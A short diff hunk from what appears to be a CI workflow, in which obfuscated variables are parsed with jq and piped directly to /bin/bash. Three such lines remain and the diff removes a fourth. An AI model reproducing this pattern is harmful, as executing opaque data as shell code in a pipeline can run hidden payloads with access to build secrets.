@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$x54" | jq -r .r3 | /bin/bash
           echo $iq00 | jq -r .a798 | /bin/bash
           echo $kiofs761 | jq -r .e4 | /bin/bash
-          printf '%s' "$vnbvf36" | jq -r .xzw403 | /bin/bash
 
       - name: Save archive
         if: always()
